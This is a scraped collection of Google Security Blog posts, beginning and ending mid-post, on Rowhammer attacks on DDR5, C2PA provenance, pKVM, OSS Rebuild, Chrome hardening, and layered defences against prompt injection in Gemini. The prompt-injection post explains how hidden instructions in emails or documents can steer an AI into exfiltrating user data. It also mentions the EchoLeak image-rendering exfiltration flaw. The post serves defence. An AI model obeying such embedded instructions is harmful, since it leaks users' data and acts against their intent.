DDR5 memory. We were able to create a novel self-correcting refresh synchronization attack technique, which allowed us to perform the first-ever Rowhammer privilege escalation exploit on a standard, production-grade desktop system equipped with DDR5 memory. While this experiment was conducted on an off-the-shelf workstation equipped with recent AMD Zen processors and SK Hynix DDR5 memory, we continue to investigate the applicability of our findings to other hardware configurations.\nWe showed that current mitigations for Rowhammer attacks are not sufficient, and the issue remains a widespread problem across the industry. They do make it more difficult “but not impossible” to carry out attacks, since an attacker needs an in-depth understanding of the specific memory subsystem architecture they wish to target.\nCurrent mitigations based on TRR and ECC rely on probabilistic countermeasures that have insufficient entropy. Once an analyst understands how TRR operates, they can craft specific memory access patterns to bypass it. Furthermore, current ECC schemes were not designed as a security measure and are therefore incapable of reliably detecting errors.\nMemory encryption is an alternative countermeasure for Rowhammer. However, our current assessment is that without cryptographic integrity, it offers no valuable defense against Rowhammer. More research is needed to develop viable, practical encryption and integrity solutions.\nGoogle has been a leader in JEDEC standardization efforts, for instance with PRAC, a fully approved standard to be supported in upcoming versions of DDR5/LPDDR6. It works by accurately counting the number of times a DRAM wordline is activated and alerts the system if an excessive number of activations is detected. This close coordination between the DRAM and the system gives PRAC a reliable way to address Rowhammer.\nIn the meantime, we continue to evaluate and improve other countermeasures to ensure our workloads are resilient against Rowhammer. We collaborate with our academic and industry partners to improve analysis techniques and test platforms, and to share our findings with the broader ecosystem.\n“Phoenix: Rowhammer Attacks on DDR5 with Self-Correcting Synchronization” will be presented at IEEE Security & Privacy 2026 in San Francisco, CA (MAY 18-21, 2026).\nPost a Comment", "timestamp": "2025-10-21T13:33:50.150954"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "How Pixel and Android are bringing a new level of trust to your images with C2PA Content Credentials", "url": "http://security.googleblog.com/2025/09/pixel-android-trusted-images-c2pa-content-credentials.html", "published": "2025-09-10T11:59:00.001-04:00", "content": "At Made by Google 2025, we announced that the new Google Pixel 10 phones will support C2PA Content Credentials in Pixel Camera and Google Photos. This announcement represents a series of steps towards greater digital media transparency:\nThese capabilities are powered by Google Tensor G5, Titan M2 security chip, the advanced hardware-backed security features of the Android platform, and Pixel engineering expertise.\nIn this post, we’ll break down our architectural blueprint for bringing a new level of trust to digital media, and how developers can apply this model to their own apps on Android.\nGenerative AI can help us all to be more creative, productive, and innovative. But it can be hard to tell the difference between content that’s been AI-generated, and content created without AI. The ability to verify the source and history—or provenance—of digital content is more important than ever.\nContent Credentials convey a rich set of information about how media such as images, videos, or audio files were made, protected by the same digital signature technology that has secured online transactions and mobile apps for decades. It empowers users to identify AI-generated (or altered) content, helping to foster transparency and trust in generative AI. It can be complemented by watermarking technologies such as SynthID.\nContent Credentials are an industry standard backed by a broad coalition of leading companies for securely conveying the origin and history of media files. The standard is developed by the Coalition for Content Provenance and Authenticity (C2PA), of which Google is a steering committee member.\nThe traditional approach to classifying digital image content has focused on categorizing content as “AI” vs. “not AI”. This has been the basis for many legislative efforts, which have required the labeling of synthetic media. This traditional approach has drawbacks, as described in Chapter 5 of this seminal report by Google. Research shows that if only synthetic content is labeled as “AI”, then users falsely believe unlabeled content is “not AI”, a phenomenon called “the implied truth effect”. This is why Google is taking a different approach to applying C2PA Content Credentials.\nInstead of categorizing digital content into a simplistic “AI” vs. “not AI”, Pixel 10 takes the first steps toward implementing our vision of categorizing digital content as either i) media that comes with verifiable proof of how it was made or ii) media that doesn't.\nGiven the broad range of scenarios in which Content Credentials are attached by these apps, we designed our C2PA implementation architecture from the onset to be:\nGood actors in the C2PA ecosystem are motivated to ensure that provenance data is trustworthy. C2PA Certification Authorities (CAs), such as Google, are incentivized to only issue certificates to genuine instances of apps from trusted developers in order to prevent bad actors from undermining the system. Similarly, app developers want to protect their C2PA claim signing keys from unauthorized use. And of course, users want assurance that the media files they rely on come from where they claim. For these reasons, the C2PA defined the Conformance Program.\nThe Pixel Camera application on the Pixel 10 lineup has achieved Assurance Level 2, the highest security rating currently defined by the C2PA Conformance Program. This was made possible by a strong set of hardware-backed technologies, including Tensor G5 and the certified Titan M2 security chip, along with Android’s hardware-backed security APIs. Only mobile apps running on devices that have the necessary silicon features and Android APIs can be designed to achieve this assurance level. We are working with C2PA to help define future assurance levels that will push protections even deeper into hardware.\nAchieving Assurance Level 2 requires verifiable, difficult-to-forge evidence. Google has built an end-to-end system on Pixel 10 devices that verifies several key attributes. However, the security of any claim is fundamentally dependent on the integrity of the application and the OS, an integrity that relies on both being kept current with the latest security patches.\nThe C2PA Conformance Program requires verifiable artifacts backed by a hardware Root of Trust, which Android provides through features like Key Attestation. This means Android developers can leverage these same tools to build apps that meet this standard for their users.\nThe robust security stack we described is the foundation of privacy. But Google takes steps further to ensure your privacy even as you use Content Credentials, which required solving two additional challenges:\nChallenge 1: Server-side Processing of Certificate Requests. Google’s C2PA Certification Authorities must certify new cryptographic keys generated on-device. To prevent fraud, these certificate enrollment requests need to be authenticated. A more common approach would require user accounts for authentication, but this would create a server-side record linking a user's identity to their C2PA certificates—a privacy trade-off we were unwilling to make.\nOur Solution: Anonymous, Hardware-Backed Attestation. We solve this with Android Key Attestation, which allows Google CAs to verify what is being used (a genuine app on a secure device) without ever knowing who is using it (the user). Our CAs also enforce a strict no-logging policy for information like IP addresses that could tie a certificate back to a user.\nChallenge 2: The Risk of Traceability Through Key Reuse. A significant privacy risk in any provenance system is traceability. If the same device or app-specific cryptographic key is used to sign multiple photos, those images can be linked by comparing the key. An adversary could potentially connect a photo someone posts publicly under their real name with a photo they post anonymously, deanonymizing the creator.\nOur Solution: Unique Certificates. We eliminate this threat with a maximally private approach. Each key and certificate is used to sign exactly one image. No two images ever share the same public key, a \"One-and-Done\" Certificate Management Strategy, making it cryptographically impossible to link them. This engineering investment in user privacy is designed to set a clear standard for the industry.\nOverall, you can use Content Credentials on Pixel 10 without fear that another person or Google could use it to link any of your images to you or one another.\nImplementations of Content Credentials use trusted time-stamps to ensure the credentials can be validated even after the certificate used to produce them expires. Obtaining these trusted time-stamps typically requires connectivity to a Time-Stamping Authority (TSA) server. But what happens if the device is offline?\nThis is not a far-fetched scenario. Imagine you’ve captured a stunning photo of a remote waterfall. The image has Content Credentials that prove that it was captured by a camera, but the cryptographic certificate used to produce them will eventually expire. Without a time-stamp, that proof could become untrusted, and you're too far from a cell signal, which is required to receive one.\nTo solve this, Pixel developed an on-device, offline TSA.\nPowered by the security features of Tensor, Pixel maintains a trusted clock in a secure environment, completely isolated from the user-controlled one in Android. The clock is synchronized regularly from a trusted source while the device is online, and is maintained even after the device goes offline (as long as the phone remains powered on). This allows your device to generate its own cryptographically-signed time-stamps the moment you press the shutter—no connection required. It ensures the story behind your photo remains verifiable and trusted after its certificate expires, whether you took it in your living room or at the top of a mountain.\nC2PA Content Credentials are not the sole solution for identifying the provenance of digital media. They are, however, a tangible step toward more media transparency and trust as we continue to unlock more human creativity with AI.\nIn our initial implementation of Content Credentials on the Android platform and Pixel 10 lineup, we prioritized a higher standard of privacy, security, and usability. We invite other implementers of Content Credentials to evaluate our approach and leverage these same foundational hardware and software security primitives. The full potential of these technologies can only be realized through widespread ecosystem adoption.\nWe look forward to adding Content Credentials across more Google products in the near future.\nPost a Comment", "timestamp": "2025-10-21T13:33:50.836317"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "Android’s pKVM Becomes First Globally Certified Software to Achieve Prestigious SESIP Level 5 Security Certification", "url": "http://security.googleblog.com/2025/08/Android-pKVM-Certified-SESIP-Level-5.html", "published": "2025-08-12T12:00:00.002-04:00", "content": "Today marks a watershed moment and new benchmark for open-source security and the future of consumer electronics. Google is proud to announce that protected KVM (pKVM), the hypervisor that powers the Android Virtualization Framework, has officially achieved SESIP Level 5 certification. This makes pKVM the first software security system designed for large-scale deployment in consumer electronics to meet this assurance bar.\nThe implications for the future of secure mobile technology are profound. With this level of security assurance, Android is now positioned to securely support the next generation of high-criticality isolated workloads. This includes vital features, such as on-device AI workloads that can operate on ultra-personalized data, with the highest assurances of privacy and integrity.\nThis certification required a hands-on evaluation by Dekra, a globally recognized cybersecurity certification lab, which conducted an evaluation against the TrustCB SESIP scheme, compliant to EN-17927. Achieving Security Evaluation Standard for IoT Platforms (SESIP) Level 5 is a landmark because it incorporates AVA_VAN.5, the highest level of vulnerability analysis and penetration testing under the ISO 15408 (Common Criteria) standard. A system certified to this level has been evaluated to be resistant to highly skilled, knowledgeable, well-motivated, and well-funded attackers who may have insider knowledge and access.\nThis certification is the cornerstone of the next-generation of Android’s multi-layered security strategy. Many of the TEEs (Trusted Execution Environments) used in the industry have not been formally certified or have only achieved lower levels of security assurance. This inconsistency creates a challenge for developers looking to build highly critical applications that require a robust and verifiable level of security. The certified pKVM changes this paradigm entirely. It provides a single, open-source, and exceptionally high-quality firmware base that all device manufacturers can build upon.\nLooking ahead, Android device manufacturers will be required to use isolation technology that meets this same level of security for various security operations that the device relies on. Protected KVM ensures that every user can benefit from a consistent, transparent, and verifiably secure foundation.\nThis achievement represents just one important aspect of the immense, multi-year dedication from the Linux and KVM developer communities and multiple engineering teams at Google developing pKVM and AVF. We look forward to seeing the open-source community and Android ecosystem continue to build on this foundation, delivering a new era of high-assurance mobile technology for users.\nPost a Comment", "timestamp": "2025-10-21T13:33:51.521662"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "Introducing OSS Rebuild: Open Source, Rebuilt to Last", "url": "http://security.googleblog.com/2025/07/introducing-oss-rebuild-open-source.html", "published": "2025-07-21T17:34:00.008-04:00", "content": "Today we're excited to announce OSS Rebuild, a new project to strengthen trust in open source package ecosystems by reproducing upstream artifacts. As supply chain attacks continue to target widely-used dependencies, OSS Rebuild gives security teams powerful data to avoid compromise without burden on upstream maintainers.\nThe project comprises:\nAutomation to derive declarative build definitions for existing PyPI (Python), npm (JS/TS), and Crates.io (Rust) packages.\nSLSA Provenance for thousands of packages across our supported ecosystems, meeting SLSA Build Level 3 requirements with no publisher intervention.\nBuild observability and verification tools that security teams can integrate into their existing vulnerability management workflows.\nInfrastructure definitions to allow organizations to easily run their own instances of OSS Rebuild to rebuild, generate, sign, and distribute provenance.\nOpen source software has become the foundation of our digital world. From critical infrastructure to everyday applications, OSS components now account for 77% of modern applications. With an estimated value exceeding $12 trillion, open source software has never been more integral to the global economy.\nYet this very ubiquity makes open source an attractive target: Recent high-profile supply chain attacks have demonstrated sophisticated methods for compromising widely-used packages. Each incident erodes trust in open ecosystems, creating hesitation among both contributors and consumers.\nThe security community has responded with initiatives like OpenSSF Scorecard, pypi's Trusted Publishers, and npm's native SLSA support. However, there is no panacea: Each effort targets a certain aspect of the problem, often making tradeoffs like shifting work onto publishers and maintainers.\nOur aim with OSS Rebuild is to empower the security community to deeply understand and control their supply chains by making package consumption as transparent as using a source repository. Our rebuild platform unlocks this transparency by utilizing a declarative build process, build instrumentation, and network monitoring capabilities which, within the SLSA Build framework, produces fine-grained, durable, trustworthy security metadata.\nBuilding on the hosted infrastructure model that we pioneered with OSS Fuzz for memory issue detection, OSS Rebuild similarly seeks to use hosted resources to address security challenges in open source, this time aimed at securing the software supply chain.\nOur vision extends beyond any single ecosystem: We are committed to bringing supply chain transparency and security to all open source software development. Our initial support for the PyPI (Python), npm (JS/TS), and Crates.io (Rust) package registries—providing rebuild provenance for many of their most popular packages—is just the beginning of our journey.\nThrough automation and heuristics, we determine a prospective build definition for a target package and rebuild it. We semantically compare the result with the existing upstream artifact, normalizing each one to remove instabilities that cause bit-for-bit comparisons to fail (e.g. archive compression). Once we reproduce the package, we publish the build definition and outcome via SLSA Provenance. This attestation allows consumers to reliably verify a package's origin within the source history, understand and repeat its build process, and customize the build from a known-functional baseline (or maybe even use it to generate more detailed SBOMs).\nWith OSS Rebuild's existing automation for PyPI, npm, and Crates.io, most packages obtain protection effortlessly without user or maintainer intervention. Where automation isn't currently able to fully reproduce the package, we offer manual build specification so the whole community benefits from individual contributions.\nAnd we are also excited at the potential for AI to help reproduce packages: Build and release processes are often described in natural language documentation which, while difficult to utilize with discrete logic, is increasingly useful to language models. Our initial experiments have demonstrated the approach's viability in automating exploration and testing, with limited human intervention, even in the most complex builds.\nOSS Rebuild helps detect several classes of supply chain compromise:\nUnsubmitted Source Code - When published packages contain code not present in the public source repository, OSS Rebuild will not attest to the artifact.\nReal world attack: solana/webjs (2024)\nBuild Environment Compromise - By creating standardized, minimal build environments with comprehensive monitoring, OSS Rebuild can detect suspicious build activity or avoid exposure to compromised components altogether.\nReal world attack: tj-actions/changed-files (2025)\nStealthy Backdoors - Even sophisticated backdoors like xz often exhibit anomalous behavioral patterns during builds. OSS Rebuild's dynamic analysis capabilities can detect unusual execution paths or suspicious operations that are otherwise impractical to identify through manual review.\nReal world attack: xz-utils (2024)\nFor enterprises and security professionals, OSS Rebuild can...\nEnhance metadata without changing registries by enriching data for upstream packages. No need to maintain custom registries or migrate to a new package ecosystem.\nAugment SBOMs by adding detailed build observability information to existing Software Bills of Materials, creating a more complete security picture.\nAccelerate vulnerability response by providing a path to vendor, patch, and re-host upstream packages using our verifiable build definitions.\nFor publishers and maintainers of open source packages, OSS Rebuild can...\nStrengthen package trust by providing consumers with independent verification of the packages' build integrity, regardless of the sophistication of the original build.\nRetrofit historical packages' integrity with high-quality build attestations, regardless of whether build attestations were present or supported at the time of publication.\nReduce CI security-sensitivity allowing publishers to focus on core development work. CI platforms tend to have complex authorization and execution models and by performing separate rebuilds, the CI environment no longer needs to be load-bearing for your packages' security.\nThe easiest (but not only!) way to access OSS Rebuild attestations is to use the provided Go-based command-line interface. It can be compiled and installed easily:\n$ go install github.com/google/oss-rebuild/cmd/oss-rebuild@latest\nYou can fetch OSS Rebuild's SLSA Provenance:\n$ oss-rebuild get cratesio syn 2.0.39\n..or explore the rebuilt versions of a particular package:\n$ oss-rebuild list pypi absl-py\n..or even rebuild the package for yourself:\n$ oss-rebuild get npm lodash 4.17.20 --output=dockerfile | \\\ndocker run $(docker buildx build -q -)\nOSS Rebuild is not just about fixing problems; it's about empowering end-users to make open source ecosystems more secure and transparent through collective action. If you're a developer, enterprise, or security researcher interested in OSS security, we invite you to follow along and get involved!\nCheck out the code, share your ideas, and voice your feedback at github.com/google/oss-rebuild.\nExplore the data and contribute to improving support for your critical ecosystems and packages.\nLearn more about SLSA Provenance at slsa.dev\nPost a Comment", "timestamp": "2025-10-21T13:33:52.212215"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "Advancing Protection in Chrome on Android", "url": "http://security.googleblog.com/2025/07/advancing-protection-in-chrome-on.html", "published": "2025-07-08T13:36:00.001-04:00", "content": "Android recently announced Advanced Protection, which extends Google’s Advanced Protection Program to a device-level security setting for Android users that need heightened security—such as journalists, elected officials, and public figures. Advanced Protection gives you the ability to activate Google’s strongest security for mobile devices, providing greater peace of mind that you’re better protected against the most sophisticated threats.\nAdvanced Protection acts as a single control point for at-risk users on Android that enables important security settings across applications, including many of your favorite Google apps, including Chrome. In this post, we’d like to do a deep dive into the Chrome features that are integrated with Advanced Protection, and how enterprises and users outside of Advanced Protection can leverage them.\nAndroid Advanced Protection integrates with Chrome on Android in three main ways:\nLet’s take a look at all three, learn what they do, and how they can be controlled outside of Advanced Protection.\n“Always Use Secure Connections” (also known as HTTPS-First Mode in blog posts and HTTPS-Only Mode in the enterprise policy) is a Chrome setting that forces HTTPS wherever possible, and asks for explicit permission from you before connecting to a site insecurely. There may be attackers attempting to interpose on connections on any network, whether that network is a coffee shop, airport, or an Internet backbone. This setting protects users from these attackers reading confidential data and injecting malicious content into otherwise innocuous webpages. This is particularly useful for Advanced Protection users, since in 2023, plaintext HTTP was used as an exploitation vector during the Egyptian election.\nBeyond Advanced Protection, we previously posted about how our goal is to eventually enable “Always Use Secure Connections” by default for all Chrome users. As we work towards this goal, in the last two years we have quietly been enabling it in more places beyond Advanced Protection, to help protect more users in risky situations, while limiting the number of warnings users might click through:\n192.168.0.1\nshortlink/\n10.0.0.1\nAlways Use Secure Connections has two modes—warn on insecure public sites, and warn on any insecure site.\nHTTPSOnlyMode\nHTTPAllowlist\nSite Isolation is a security feature in Chrome that isolates each website into its own rendering OS process. This means that different websites, even if loaded in a single tab of the same browser window, are kept completely separate from each other in memory. This isolation prevents a malicious website from accessing data or code from another website, even if that malicious website manages to exploit a vulnerability in Chrome’s renderer—a second bug to escape the renderer sandbox is required to access other sites. Site isolation improves security, but requires extra memory to have one process per site. Chrome Desktop isolates all sites by default. However, Android is particularly sensitive to memory usage, so for mobile Android form factors, when Advanced Protection is off, Chrome will only isolate a site if a user logs into that site, or if the user submits a form on that site. On Android devices with 4GB+ RAM in Advanced Protection (and on all desktop clients), Chrome will isolate all sites. Full Site Isolation significantly reduces the risk of cross-site data leakage for Advanced Protection users.\nAdvanced Protection reduces the attack surface of Chrome by disabling the higher-level optimizing Javascript compilers inside V8. V8 is Chrome’s high-performance Javascript and WebAssembly engine. The optimizing compilers in V8 make certain websites run faster, however they historically also have been a source of known exploitation of Chrome. Of all the patched security bugs in V8 with known exploitation, disabling the optimizers would have mitigated ~50%. However, the optimizers are why Chrome scores the highest on industry-wide benchmarks such as Speedometer. Disabling the optimizers blocks a large class of exploits, at the cost of causing performance issues for some websites.\nJavascript optimizers can be disabled outside of Advanced Protection Mode via the “Javascript optimization & security” Site Setting. The Site Setting also enables users to disable/enable Javascript optimizers on a per-site basis. Disabling these optimizing compilers is not limited to Advanced Protection. Since Chrome 133, we’ve exposed this as a Site Setting that allows users to enable or disable the higher-level optimizing compilers on a per-site basis, as well as change the default.\nSettings -> Privacy and Security -> Javascript optimization and security\nThis setting can be controlled by the DefaultJavaScriptOptimizerSetting enterprise policy, alongside JavaScriptOptimizerAllowedForSites and JavaScriptOptimizerBlockedForSites for managing the allowlist and denylist. Enterprises can use this policy to block access to the optimizer, while still allowlisting1 the SaaS vendors their employees use on a daily basis. It’s available on Android and desktop platforms\nDefaultJavaScriptOptimizerSetting\nJavaScriptOptimizerAllowedForSites\nJavaScriptOptimizerBlockedForSites\nChrome aims for the default configuration to be secure for all its users, and we’re continuing to raise the bar for V8 security in the default configuration by rolling out the V8 sandbox.\nBillions of people use Chrome and Android, and not all of them have the same risk profile. Less sophisticated attacks by commodity malware can be very lucrative for attackers when done at scale, but so can sophisticated attacks on targeted users. This means that we cannot expect the security tradeoffs we make for the default configuration of Chrome to be suitable for everyone.\nAdvanced Protection, and the security settings associated with it, are a way for users with varying risk profiles to tailor Chrome to their security needs, either as an individual at-risk user. Enterprises with a fleet of managed Chrome installations can also enable the underlying settings now. Advanced Protection is available on Android 16 in Chrome 137+.\nWe additionally recommend at-risk users join the Advanced Protection Program with their Google accounts, which will require the account to use phishing-resistant multi-factor authentication methods and enable Advanced Protection on any of the user’s Android devices. We also recommend users enable automatic updates and always keep their Android phones and web browsers up to date.\nPost a Comment", "timestamp": "2025-10-21T13:33:52.895414"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "Mitigating prompt injection attacks with a layered defense strategy", "url": "http://security.googleblog.com/2025/06/mitigating-prompt-injection-attacks.html", "published": "2025-06-13T12:03:00.007-04:00", "content": "With the rapid adoption of generative AI, a new wave of threats is emerging across the industry with the aim of manipulating the AI systems themselves. One such emerging attack vector is indirect prompt injections. Unlike direct prompt injections, where an attacker directly inputs malicious commands into a prompt, indirect prompt injections involve hidden malicious instructions within external data sources. These may include emails, documents, or calendar invites that instruct AI to exfiltrate user data or execute other rogue actions. As more governments, businesses, and individuals adopt generative AI to get more done, this subtle yet potentially potent attack becomes increasingly pertinent across the industry, demanding immediate attention and robust security measures.\nAt Google, our teams have a longstanding precedent of investing in a defense-in-depth strategy, including robust evaluation, threat analysis, AI security best practices, AI red-teaming, adversarial training, and model hardening for generative AI tools. This approach enables safer adoption of Gemini in Google Workspace and the Gemini app (we refer to both in this blog as “Gemini” for simplicity). Below we describe our prompt injection mitigation product strategy based on extensive research, development, and deployment of improved security mitigations.\nGoogle has taken a layered security approach introducing security measures designed for each stage of the prompt lifecycle. From Gemini 2.5 model hardening, to purpose-built machine learning (ML) models detecting malicious instructions, to system-level safeguards, we are meaningfully elevating the difficulty, expense, and complexity faced by an attacker. This approach compels adversaries to resort to methods that are either more easily identified or demand greater resources.\nOur model training with adversarial data significantly enhanced our defenses against indirect prompt injection attacks in Gemini 2.5 models (technical details). This inherent model resilience is augmented with additional defenses that we built directly into Gemini, including:\nPrompt injection content classifiers\nSecurity thought reinforcement\nMarkdown sanitization and suspicious URL redaction\nUser confirmation framework\nEnd-user security mitigation notifications\nThis layered approach to our security strategy strengthens the overall security framework for Gemini – throughout the prompt lifecycle and across diverse attack techniques.\n1. Prompt injection content classifiers\nThrough collaboration with leading AI security researchers via Google's AI Vulnerability Reward Program (VRP), we've curated one of the world’s most advanced catalogs of generative AI vulnerabilities and adversarial data. Utilizing this resource, we built and are in the process of rolling out proprietary machine learning models that can detect malicious prompts and instructions within various formats, such as emails and files, drawing from real-world examples. Consequently, when users query Workspace data with Gemini, the content classifiers filter out harmful data containing malicious instructions, helping to ensure a secure end-to-end user experience by retaining only safe content. For example, if a user receives an email in Gmail that includes malicious instructions, our content classifiers help to detect and disregard malicious instructions, then generate a safe response for the user. This is in addition to built-in defenses in Gmail that automatically block more than 99.9% of spam, phishing attempts, and malware.\nA diagram of Gemini’s actions based on the detection of the malicious instructions by content classifiers.\n2. Security thought reinforcement\nThis technique adds targeted security instructions surrounding the prompt content to remind the large language model (LLM) to perform the user-directed task and ignore any adversarial instructions that could be present in the content. With this approach, we steer the LLM to stay focused on the task and ignore harmful or malicious requests added by a threat actor to execute indirect prompt injection attacks.\nA diagram of Gemini’s actions based on additional protection provided by the security thought reinforcement technique.\n3. Markdown sanitization and suspicious URL redaction\nOur markdown sanitizer identifies external image URLs and will not render them, making the “EchoLeak” 0-click image rendering exfiltration vulnerability not applicable to Gemini. From there, a key protection against prompt injection and data exfiltration attacks occurs at the URL level. With external data containing dynamic URLs, users may encounter unknown risks as these URLs may be designed for indirect prompt injections and data exfiltration attacks. Malicious instructions executed on a user's behalf may also generate harmful URLs. With Gemini, our defense system includes suspicious URL detection based on Google Safe Browsing to differentiate between safe and unsafe links, providing a secure experience by helping to prevent URL-based attacks. For example, if a document contains malicious URLs and a user is summarizing the content with Gemini, the suspicious URLs will be redacted in Gemini’s response.\nGemini in Gmail provides a summary of an email thread. In the summary, there is an unsafe URL. That URL is redacted in the response and is replaced with the text “suspicious link removed”.\n4. User confirmation framework\nGemini also features a contextual user confirmation system. This framework enables Gemini to require user confirmation for certain actions, also known as “Human-In-The-Loop” (HITL), using these responses to bolster security and streamline the user experience. For example, potentially risky operations like deleting a calendar event may trigger an explicit user confirmation request, thereby helping to prevent undetected or immediate execution of the operation.\nThe Gemini app with instructions to delete all events on Saturday. Gemini responds with the events found on Google Calendar and asks the user to confirm this action.\n5. End-user security mitigation notifications\nA key aspect to keeping our users safe is sharing details on attacks that we’ve stopped so users can watch out for similar attacks in the future. To that end, when security issues are mitigated with our built-in defenses, end users are provided with contextual information allowing them to learn more via dedicated help center articles. For example, if Gemini summarizes a file containing malicious instructions and one of Google’s prompt injection defenses mitigates the situation, a security notification with a “Learn more” link will be displayed for the user. Users are encouraged to become more familiar with our prompt injection defenses by reading the Help Center article.\nGemini in Docs with instructions to provide a summary of a file. Suspicious content was detected and a response was not provided. There is a yellow security notification banner for the user and a statement that Gemini’s response has been removed, with a “Learn more” link to a relevant Help Center article.\nOur comprehensive prompt injection security strategy strengthens the overall security framework for Gemini. Beyond the techniques described above, it also involves rigorous testing through manual and automated red teams, generative AI security BugSWAT events, strong security standards like our Secure AI Framework (SAIF), and partnerships with both external researchers via the Google AI Vulnerability Reward Program (VRP) and industry peers via the Coalition for Secure AI (CoSAI). Our commitment to trust includes collaboration with the security community to responsibly disclose AI security vulnerabilities, share our latest threat intelligence on ways we see bad actors trying to leverage AI, and offering insights into our work to build stronger prompt injection defenses.\nWorking closely with industry partners is crucial to building stronger protections for all of our users. To that end, we’re fortunate to have strong collaborative partnerships with numerous researchers, such as Ben Nassi (Confidentiality), Stav Cohen (Technion), and Or Yair (SafeBreach), as well as other AI Security researchers participating in our BugSWAT events and AI VRP program. We appreciate the work of these researchers and others in the community to help us red team and refine our defenses.\nWe continue working to make upcoming Gemini models inherently more resilient and add additional prompt injection defenses directly into Gemini later this year. To learn more about Google’s progress and research on generative AI threat actors, attack techniques, and vulnerabilities, take a look at the following resources:\nBeyond Speculation: Data-Driven Insights into AI and Cybersecurity (RSAC 2025 conference keynote) from Google’s Threat Intelligence Group (GTIG)\nAdversarial Misuse of Generative AI (blog post) from Google’s Threat Intelligence Group (GTIG)\nGoogle's Approach for Secure AI Agents (white paper) from Google’s Secure AI Framework (SAIF) team\nAdvancing Gemini's security safeguards (blog post) from Google’s DeepMind team\nLessons from Defending Gemini Against Indirect Prompt Injections (white paper) from Google’s DeepMind team\nPost a Comment", "timestamp": "2025-10-21T13:33:53.632608"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "Sustaining Digital Certificate Security - Upcoming Changes to the Chrome Root Store", "url": "http://security.googleblog.com/2025/05/sustaining-digital-certificate-security-chrome-root-store-changes.html", "published": "2025-05-30T10:59:00.005-04:00", "content": "Note: Google Chrome communicated its removal of default trust of Chunghwa Telecom and Netlock in the public forum on May 30, 2025.\nThe Chrome Root Program Policy states that Certification Authority (CA) certificates included in the Chrome Root Store must provide value to Chrome end users that exceeds the risk of their continued inclusion. It also describes many of the factors we consider significant when CA Owners disclose and respond to incidents. When things don’t go right, we expect CA Owners to commit to meaningful and demonstrable change resulting in evidenced continuous improvement.\nChrome's confidence in the reliability of Chunghwa Telecom and Netlock as CA Owners included in the Chrome Root Store has diminished due to patterns of concerning behavior observed over the past year. These patterns represent a loss of integrity and fall short of expectations, eroding trust in these CA Owners as publicly-trusted certificate issuers trusted by default in Chrome. To safeguard Chrome’s users, and preserve the integrity of the Chrome Root Store, we are taking the following action.\nUpcoming change in Chrome 139 and higher:\nThis approach attempts to minimize disruption to existing subscribers using a previously announced Chrome feature to remove default trust based on the SCTs in certificates.\nAdditionally, should a Chrome user or enterprise explicitly trust any of the above certificates on a platform and version of Chrome relying on the Chrome Root Store (e.g., explicit trust is conveyed through a Group Policy Object on Windows), the SCT-based constraints described above will be overridden and certificates will function as they do today.\nTo further minimize risk of disruption, website operators are encouraged to review the “Frequently Asked Questions\" listed below.\nCAs serve a privileged and trusted role on the internet that underpin encrypted connections between browsers and websites. With this tremendous responsibility comes an expectation of adhering to reasonable and consensus-driven security and compliance expectations, including those defined by the CA/Browser Forum TLS Baseline Requirements.\nOver the past several months and years, we have observed a pattern of compliance failures, unmet improvement commitments, and the absence of tangible, measurable progress in response to publicly disclosed incident reports. When these factors are considered in aggregate and considered against the inherent risk each publicly-trusted CA poses to the internet, continued public trust is no longer justified.\nThe action of Chrome, by default, no longer trusting new TLS certificates issued by these CAs will begin on approximately August 1, 2025, affecting certificates issued at that point or later.\nThis action will occur in Versions of Chrome 139 and greater on Windows, macOS, ChromeOS, Android, and Linux. Apple policies prevent the Chrome Certificate Verifier and corresponding Chrome Root Store from being used on Chrome for iOS.\nBy default, Chrome users in the above populations who navigate to a website serving a certificate from Chunghwa Telecom or Netlock issued after July 31, 2025 will see a full page interstitial similar to this one.\nCertificates issued by other CAs are not impacted by this action.\nWebsite operators can determine if they are affected by this action by using the Chrome Certificate Viewer.\nUse the Chrome Certificate Viewer\nWe recommend that affected website operators transition to a new publicly-trusted CA Owner as soon as reasonably possible. To avoid adverse website user impact, action must be completed before the existing certificate(s) expire if expiry is planned to take place after July 31, 2025.\nWhile website operators could delay the impact of blocking action by choosing to collect and install a new TLS certificate issued from Chunghwa Telecom or Netlock before Chrome’s blocking action begins on August 1, 2025, website operators will inevitably need to collect and install a new TLS certificate from one of the many other CAs included in the Chrome Root Store.\nYes.\nA command-line flag was added beginning in Chrome 128 that allows administrators and power users to simulate the effect of an SCTNotAfter distrust constraint as described in this blog post.\nHow to: Simulate an SCTNotAfter distrust\n1. Close all open versions of Chrome\n2. Start Chrome using the following command-line flag, substituting variables described below with actual values\n3. Evaluate the effects of the flag with test websites\nLearn more about command-line flags here.\nBeginning in Chrome 127, enterprises can override Chrome Root Store constraints like those described in this blog post by installing the corresponding root CA certificate as a locally-trusted root on the platform Chrome is running (e.g., installed in the Microsoft Certificate Store as a Trusted Root CA).\nCustomer organizations should use this enterprise policy or defer to platform provider guidance for trusting root CA certificates.\nOther Google product team updates may be made available in the future.\nPost a Comment", "timestamp": "2025-10-21T13:33:54.316975"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "Tracking the Cost of Quantum Factoring", "url": "http://security.googleblog.com/2025/05/tracking-cost-of-quantum-factori.html", "published": "2025-05-23T07:57:00.000-04:00", "content": "Google Quantum AI's mission is to build best in class quantum computing for otherwise unsolvable problems. For decades the quantum and security communities have also known that large-scale quantum computers will at some point in the future likely be able to break many of today’s secure public key cryptography algorithms, such as Rivest–Shamir–Adleman (RSA). Google has long worked with the U.S. National Institute of Standards and Technology (NIST) and others in government, industry, and academia to develop and transition to post-quantum cryptography (PQC), which is expected to be resistant to quantum computing attacks. As quantum computing technology continues to advance, ongoing multi-stakeholder collaboration and action on PQC is critical.\nIn order to plan for the transition from today’s cryptosystems to an era of PQC, it's important the size and performance of a future quantum computer that could likely break current cryptography algorithms is carefully characterized. Yesterday, we published a preprint demonstrating that 2048-bit RSA encryption could theoretically be broken by a quantum computer with 1 million noisy qubits running for one week. This is a 20-fold decrease in the number of qubits from our previous estimate, published in 2019. Notably, quantum computers with relevant error rates currently have on the order of only 100 to 1000 qubits, and the National Institute of Standards and Technology (NIST) recently released standard PQC algorithms that are expected to be resistant to 